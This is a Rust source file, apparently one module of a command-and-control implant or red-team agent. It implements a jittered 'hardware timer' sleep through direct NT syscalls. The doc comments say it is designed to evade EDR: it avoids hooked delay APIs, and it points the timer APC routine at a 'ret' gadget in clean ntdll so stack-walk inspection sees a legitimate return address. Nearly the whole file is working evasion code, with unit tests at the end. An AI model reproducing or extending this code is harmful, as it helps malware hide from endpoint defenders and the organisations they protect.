//! Timer-based sleep with hardware timestamps.
//!
//! Uses `NtCreateTimer` + `NtSetTimer` + `NtWaitForSingleObject` to perform
//! a sleep without calling `NtDelayExecution` or any `kernel32!Sleep*`
//! variant.  The timer fires through a different kernel path (KE_TIMER →
//! KiDeliverApc) that is less commonly monitored by EDR.
//!
//! Key evasion properties:
//! - **No NtDelayExecution**: avoids the most-hooked delay syscall.
//! - **Hardware timestamp source**: uses `NtQueryPerformanceCounter` for
//!   high-resolution timing rather than `GetTickCount` / `QueryPerformanceCounter`
//!   from kernel32, which may also be hooked.
//! - **Clean APC callback address**: when an APC is supplied, the callback
//!   address is pointed at a `ret` gadget inside a cleanly-mapped ntdll page
//!   so that EDR stack-walk inspection sees a legitimate ntdll return address.
//! - **Alertable wait**: `NtWaitForSingleObject(alertable=TRUE)` is used so
//!   that kernel APCs (including the timer DPC completion) fire normally.

use anyhow::{anyhow, Result};
use std::time::Duration;

// ── Constants ────────────────────────────────────────────────────────────────

/// TIMER_ALL_ACCESS — full access mask for NtCreateTimer.
const TIMER_ALL_ACCESS: u32 = 0x001F0003;

/// Notification timer type (as opposed to SynchronizationTimer = 1).
const NOTIFICATION_TIMER: u32 = 0;

/// Convert a `Duration` to a negative 100-ns relative timeout for NT APIs.
/// The NT kernel interprets negative LARGE_INTEGER values as relative offsets
/// from the current time.
#[inline]
const fn duration_to_100ns(dur: Duration) -> i64 {
    -((dur.as_nanos() / 100) as i64)
}

// ── Hardware timer sleeper ───────────────────────────────────────────────────

/// State for a single hardware-timer-based sleep cycle.
///
/// Holds the timer handle and optional callback context.  The `Drop` impl
/// ensures the timer handle is always closed, even if the caller forgets
/// to explicitly clean up.
struct HardwareTimerSleeper {
    /// NT handle to the waitable timer object.
    timer_handle: usize,
    /// Optional gadget address used as the APC routine pointer.
    /// When set, points to a `ret` instruction inside a clean ntdll page
    /// so that EDR stack walks see a legitimate return address.
    _callback_address: Option<usize>,
}

impl HardwareTimerSleeper {
    /// Create a new hardware timer sleeper.
    ///
    /// Allocates an unnamed notification timer via `NtCreateTimer`.
    fn new() -> Result<Self> {
        let handle = create_high_resolution_timer()?;
        Ok(Self {
            timer_handle: handle,
            _callback_address: None,
        })
    }

    /// Create a sleeper with a clean APC gadget address.
    ///
    /// The `callback_address` is used as the `TimerApcRoutine` parameter
    /// in `NtSetTimer`.  Pointing this at a `ret` gadget inside a
    /// cleanly-mapped ntdll page makes the APC dispatch appear as a
    /// normal ntdll return to EDR stack-walking tools.
    fn with_callback(callback_address: usize) -> Result<Self> {
        let handle = create_high_resolution_timer()?;
        Ok(Self {
            timer_handle: handle,
            _callback_address: Some(callback_address),
        })
    }

    /// Set the timer to fire after `duration` and wait for it.
    ///
    /// Uses `NtQueryPerformanceCounter` to stamp the start time, then
    /// `NtSetTimer` with a negative relative timeout, and finally
    /// `NtWaitForSingleObject` (alertable) to block until the timer
    /// fires.
    fn wait(&mut self, duration: Duration) -> Result<()> {
        // Stamp start time via hardware counter (avoids kernel32 imports).
        let _start_ts = hw_timestamp();

        set_timer_with_hw_timestamp(self.timer_handle, duration)?;

        // Wait indefinitely (timeout=NULL) with alertable=TRUE so the
        // timer DPC → APC delivery can proceed normally.
        let wait_status = unsafe {
            crate::syscalls::syscall_NtWaitForSingleObject(
                self.timer_handle as u64,
                1u64, // Alertable = TRUE
                0u64, // No timeout — wait until signaled
            )
        };

        if wait_status < 0 {
            return Err(anyhow!(
                "NtWaitForSingleObject on timer failed: NTSTATUS={:#010x}",
                wait_status as u32
            ));
        }

        Ok(())
    }

    /// Set the timer and wait, supplying a clean APC gadget address.
    ///
    /// When `callback_address` is `Some(addr)`, the address is passed as
    /// `TimerApcRoutine` to `NtSetTimer`.  The kernel will invoke this
    /// address as the APC callback when the timer fires, but since it
    /// points to a single `ret` instruction, it returns immediately and
    /// the wait completes normally.  The purpose is purely to place a
    /// clean return address on the kernel APC dispatch stack frame.
    fn wait_with_apc_gadget(
        &mut self,
        duration: Duration,
        callback_address: usize,
    ) -> Result<()> {
        let _start_ts = hw_timestamp();

        set_timer_with_apc_gadget(self.timer_handle, duration, callback_address)?;

        let wait_status = unsafe {
            crate::syscalls::syscall_NtWaitForSingleObject(
                self.timer_handle as u64,
                1u64, // Alertable = TRUE
                0u64, // No timeout — wait until signaled
            )
        };

        if wait_status < 0 {
            return Err(anyhow!(
                "NtWaitForSingleObject on timer (APC gadget) failed: NTSTATUS={:#010x}",
                wait_status as u32
            ));
        }

        Ok(())
    }
}

impl Drop for HardwareTimerSleeper {
    fn drop(&mut self) {
        if self.timer_handle != 0 {
            unsafe {
                crate::syscalls::syscall_NtClose(self.timer_handle as u64);
            }
            self.timer_handle = 0;
        }
    }
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Perform a hardware-timer-based sleep for the given `duration`.
///
/// Creates an unnamed waitable timer, sets it with a negative relative
/// timeout derived from `duration`, and waits alertably on the timer
/// handle.  Avoids `NtDelayExecution`, `Sleep`, `SleepEx`, and all
/// `kernel32!Sleep*` variants.
///
/// Returns `Ok(())` when the timer fires, or `Err` if any NT API call
/// fails (e.g., timer creation fails due to handle exhaustion).
pub fn hardware_timer_sleep(duration: Duration) -> Result<()> {
    let mut sleeper = HardwareTimerSleeper::new()?;
    sleeper.wait(duration)
}

/// Perform a hardware-timer-based sleep with a clean APC gadget address.
///
/// Like [`hardware_timer_sleep`], but the APC routine parameter in
/// `NtSetTimer` is pointed at `callback_address` — which should be the
/// address of a `ret` instruction inside a cleanly-mapped system DLL.
/// This makes the timer APC dispatch appear as a normal system DLL call
/// to EDR stack-walking tools.
pub fn hardware_timer_sleep_with_gadget(duration: Duration, gadget_addr: usize) -> Result<()> {
    let mut sleeper = HardwareTimerSleeper::with_callback(gadget_addr)?;
    sleeper.wait_with_apc_gadget(duration, gadget_addr)
}

/// Main sleep-loop entry point for the hardware timer method.
///
/// Called from `obfuscated_sleep::execute_sleep` when the operator
/// selects `method = "hardware-timer"`.  Computes a jittered duration
/// from `duration_range` and `jitter`, then delegates to
/// [`hardware_timer_sleep`].
///
/// # Arguments
///
/// * `duration_range` — `(min, max)` duration bounds for jitter.
/// * `jitter` — fractional jitter in `[0.0, 1.0]`.  A value of `0.0`
///   sleeps for the full max duration; `1.0` randomises uniformly
///   across the range.
pub fn hw_timer_sleep_loop(duration_range: (Duration, Duration), jitter: f64) -> Result<()> {
    let (min_dur, max_dur) = duration_range;
    let actual = compute_jittered_duration(min_dur, max_dur, jitter);
    hardware_timer_sleep(actual)
}

// ── Timer creation ───────────────────────────────────────────────────────────

/// Create an unnamed high-resolution notification timer.
///
/// Uses `NtCreateTimer` with `TIMER_ALL_ACCESS` and notification type.
/// Returns the timer handle on success, or an error if the NT call fails.
fn create_high_resolution_timer() -> Result<usize> {
    let mut timer_handle: usize = 0;

    let status = unsafe {
        crate::syscalls::syscall_NtCreateTimer(
            &mut timer_handle as *mut _ as u64,
            TIMER_ALL_ACCESS as u64,
            0u64, // NULL ObjectAttributes (unnamed timer)
            NOTIFICATION_TIMER as u64,
        )
    };

    if status < 0 || timer_handle == 0 {
        return Err(anyhow!(
            "NtCreateTimer failed: NTSTATUS={:#010x}",
            status as u32
        ));
    }

    Ok(timer_handle)
}

// ── Timer set (plain, no APC) ────────────────────────────────────────────────

/// Set the timer with a negative relative timeout derived from `duration`.
///
/// The timer is configured as one-shot (period=0) with no APC routine.
/// The caller is expected to wait on the timer handle via
/// `NtWaitForSingleObject`.
fn set_timer_with_hw_timestamp(timer_handle: usize, duration: Duration) -> Result<()> {
    let mut due_time = duration_to_100ns(duration);

    let status = unsafe {
        crate::syscalls::syscall_NtSetTimer(
            timer_handle as u64,
            &mut due_time as *mut _ as u64,
            0u64, // No APC routine
            0u64, // No context
            0u64, // ResumeTimer = FALSE
            0u64, // Period = 0 (one-shot)
            0u64, // No previous state output
        )
    };

    if status < 0 {
        return Err(anyhow!(
            "NtSetTimer failed: NTSTATUS={:#010x}",
            status as u32
        ));
    }

    Ok(())
}

// ── Timer set (with APC gadget) ──────────────────────────────────────────────

/// Set the timer with a negative relative timeout and a clean APC gadget.
///
/// The `gadget_addr` is passed as the `TimerApcRoutine` parameter so
/// that the kernel invokes a `ret` gadget in a clean DLL page when the
/// timer fires.  This makes the APC dispatch stack frame look legitimate
/// to EDR.
fn set_timer_with_apc_gadget(
    timer_handle: usize,
    duration: Duration,
    gadget_addr: usize,
) -> Result<()> {
    let mut due_time = duration_to_100ns(duration);

    let status = unsafe {
        crate::syscalls::syscall_NtSetTimer(
            timer_handle as u64,
            &mut due_time as *mut _ as u64,
            gadget_addr as u64, // APC routine → clean gadget
            0u64,               // No context
            0u64,               // ResumeTimer = FALSE
            0u64,               // Period = 0 (one-shot)
            0u64,               // No previous state output
        )
    };

    if status < 0 {
        return Err(anyhow!(
            "NtSetTimer (APC gadget) failed: NTSTATUS={:#010x}",
            status as u32
        ));
    }

    Ok(())
}

// ── Hardware timestamp ───────────────────────────────────────────────────────

/// Read a high-resolution hardware timestamp via `NtQueryPerformanceCounter`.
///
/// Uses the direct syscall infrastructure (same SSN resolution as all
/// other NT calls) rather than kernel32!QueryPerformanceCounter, which
/// is often hooked by EDR.
///
/// Returns the raw performance counter value, or 0 on failure (timestamp
/// is informational only and a failure should not block the sleep).
fn hw_timestamp() -> u64 {
    let mut counter: i64 = 0;

    // Use the syscall! macro for NtQueryPerformanceCounter — it resolves
    // via get_syscall_id and dispatches through do_syscall, exactly like
    // the NtCreateTimer / NtSetTimer wrappers.
    let status: i32 = match unsafe {
        crate::syscall!(
            "NtQueryPerformanceCounter",
            &mut counter as *mut _ as u64,
            std::ptr::null_mut::<u64>() as u64,
        )
    } {
        Ok(s) => s,
        Err(e) => {
            log::debug!("hw_timestamp: NtQueryPerformanceCounter failed: {}", e);
            return 0;
        }
    };

    if status != 0 {
        log::debug!(
            "hw_timestamp: NtQueryPerformanceCounter returned {:#010x}, using 0",
            status as u32
        );
        0
    } else {
        counter as u64
    }
}

// ── Jitter computation ───────────────────────────────────────────────────────

/// Compute a jittered sleep duration within `[min_dur, max_dur]`.
///
/// `jitter` is in `[0.0, 1.0]`:
/// - `0.0` → always return `max_dur`
/// - `1.0` → uniform random in `[min_dur, max_dur]`
/// - intermediate values scale the random range proportionally
fn compute_jittered_duration(min_dur: Duration, max_dur: Duration, jitter: f64) -> Duration {
    use rand::Rng;

    let jitter = jitter.clamp(0.0, 1.0);
    let range_ns = (max_dur.as_nanos() as f64) - (min_dur.as_nanos() as f64);

    if range_ns <= 0.0 || jitter == 0.0 {
        return max_dur;
    }

    let mut rng = rand::thread_rng();
    let offset: f64 = rng.gen_range(0.0..=1.0);
    let actual_ns = (max_dur.as_nanos() as f64) - (offset * jitter * range_ns);
    Duration::from_nanos(actual_ns as u64)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn duration_to_100ns_converts_correctly() {
        // 1 second = 10,000,000 × 100-ns units → negative relative = -10_000_000
        let dur = Duration::from_secs(1);
        let ns = duration_to_100ns(dur);
        assert_eq!(ns, -10_000_000i64);

        // 500ms = 5,000,000 × 100-ns units
        let dur = Duration::from_millis(500);
        let ns = duration_to_100ns(dur);
        assert_eq!(ns, -5_000_000i64);
    }

    #[test]
    fn compute_jittered_duration_zero_jitter_returns_max() {
        let min = Duration::from_secs(5);
        let max = Duration::from_secs(10);
        let result = compute_jittered_duration(min, max, 0.0);
        assert_eq!(result, max);
    }

    #[test]
    fn compute_jittered_duration_range_respected() {
        let min = Duration::from_secs(5);
        let max = Duration::from_secs(10);
        // With full jitter, result should be within [min, max]
        for _ in 0..100 {
            let result = compute_jittered_duration(min, max, 1.0);
            assert!(result >= min, "result {:?} < min {:?}", result, min);
            assert!(result <= max, "result {:?} > max {:?}", result, max);
        }
    }

    #[test]
    fn compute_jittered_duration_clamps_jitter() {
        let min = Duration::from_secs(5);
        let max = Duration::from_secs(10);
        // Negative jitter should be clamped to 0.0 → returns max
        let result = compute_jittered_duration(min, max, -1.0);
        assert_eq!(result, max);
        // >1.0 jitter clamped to 1.0 → still within range
        let result = compute_jittered_duration(min, max, 5.0);
        assert!(result >= min && result <= max);
    }
}
